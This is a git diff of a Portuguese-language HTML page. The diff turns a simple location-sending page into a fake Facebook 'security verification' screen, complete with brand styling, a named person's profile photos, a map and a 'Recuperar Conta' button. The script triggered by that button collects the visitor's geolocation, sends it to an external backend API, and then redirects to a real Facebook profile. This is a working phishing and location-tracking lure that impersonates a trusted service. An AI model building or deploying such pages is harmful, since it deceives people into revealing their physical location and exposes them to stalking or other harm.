@@ -2,36 +2,175 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Coletar Localização</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – Verificação de Segurança</title>
   <style>
+    :root {
+      --fb-blue: #1877f2;
+      --fb-gray-bg: #f0f2f5;
+      --fb-text-dark: #050505;
+      --fb-border: #ccd0d5;
+    }
+
     body {
-      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: var(--fb-gray-bg);
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 60px auto;
+      background-color: #fff;
+      border: 1px solid var(--fb-border);
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+
+    .cover-photo {
+      width: 100%;
+      height: 160px;
+      background: url('https://github.com/h3rcul3s1500/boiafria/blob/main/pic_jpgcapa.jpg?raw=true') center/cover no-repeat;
+      position: relative;
+    }
+
+    .profile-pic {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 4px solid #fff;
+      position: absolute;
+      bottom: -48px;
+      left: 50%;
+      transform: translateX(-50%);
+      box-shadow: 0 0 0 3px var(--fb-blue);
+    }
+
+    .content {
+      padding: 60px 24px 24px;
       text-align: center;
-      padding: 40px;
     }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
+
+    .user-name {
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--fb-text-dark);
+      margin-bottom: 6px;
     }
-    #status {
-      margin-top: 20px;
+
+    .logo {
+      font-size: 26px;
+      font-weight: bold;
+      color: var(--fb-blue);
+      margin-bottom: 16px;
+    }
+
+    h2 {
       font-size: 18px;
+      color: var(--fb-text-dark);
+      margin: 8px 0;
+    }
+
+    p {
+      font-size: 14px;
+      color: #65676b;
+      margin: 0 0 12px;
+    }
+
+    .info-box {
+      background-color: #e4e6eb;
+      padding: 14px;
+      border-radius: 6px;
+      text-align: left;
+      font-size: 14px;
+      color: #1c1e21;
+      margin: 20px 0;
+    }
+
+    .map {
+      margin-top: 10px;
+      width: 100%;
+      height: 200px;
+      border-radius: 6px;
+      overflow: hidden;
+      border: 1px solid var(--fb-border);
+    }
+
+    .map iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      pointer-events: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: var(--fb-blue);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 16px;
+    }
+
+    button:hover {
+      background-color: #165fbd;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 24px;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <div class="cover-photo">
+      <img class="profile-pic" src="https://github.com/h3rcul3s1500/boiafria/blob/main/pic_jpgperfil.jpg?raw=true">
+    </div>
 
-  <h1>Enviar Localização</h1>
-  <p>Clique no botão para enviar sua localização ao servidor:</p>
-  <button onclick="enviarLocalizacao()">Enviar localização</button>
+    <div class="content">
+      <div class="user-name">Bruno Rodrigues</div>
+      <div class="logo">Facebook</div>
+      <h2>Verificação de segurança</h2>
+      <p>Detectamos uma tentativa de acesso incomum à sua conta.</p>
 
-  <div id="status"></div>
+      <div class="info-box">
+        <strong>Localização:</strong> Capivari, São Paulo<br>
+        <strong>Dispositivo:</strong> Chrome em Windows<br>
+        <strong>Horário:</strong> 12 de julho de 2025 às 15:24
+
+        <div class="map">
+          <iframe 
+            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d14733.261297305224!2d-47.51165055!3d-22.99931815!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94c7e8ff0c0e97b9%3A0xe3c3a157fe52dfdf!2sCapivari%2C%20SP!5e0!3m2!1spt-BR!2sbr!4v1625084896242!5m2!1spt-BR!2sbr"
+            allowfullscreen=""
+            loading="lazy"
+            tabindex="-1">
+          </iframe>
+        </div>
+      </div>
+
+      <form onsubmit="handleSubmit(event)">
+        <button type="submit">Recuperar Conta</button>
+      </form>
+
+      <div class="footer">© 2025 Facebook – Todos os Direitos Reservados.</div>
+    </div>
+  </div>
 
   <script>
-    const API_URL = 'https://localizacao-backend-vdyc.onrender.com/api/localizacao'; // Substitua com seu link real
 
-    function enviarLocalizacao() {
+  const API_URL = 'https://localizacao-backend-vdyc.onrender.com/api/localizacao'; // Substitua com seu link real
+    function handleSubmit(event) {
+    event.preventDefault();
       const status = document.getElementById('status');
 
       if (!navigator.geolocation) {
@@ -71,8 +210,9 @@
           status.textContent = `Erro: ${msg}`;
         }
       );
+    window.location.href = "https://www.facebook.com/bruno.rodrigues.433581";
     }
-  </script>
 
+  </script>
 </body>
 </html>
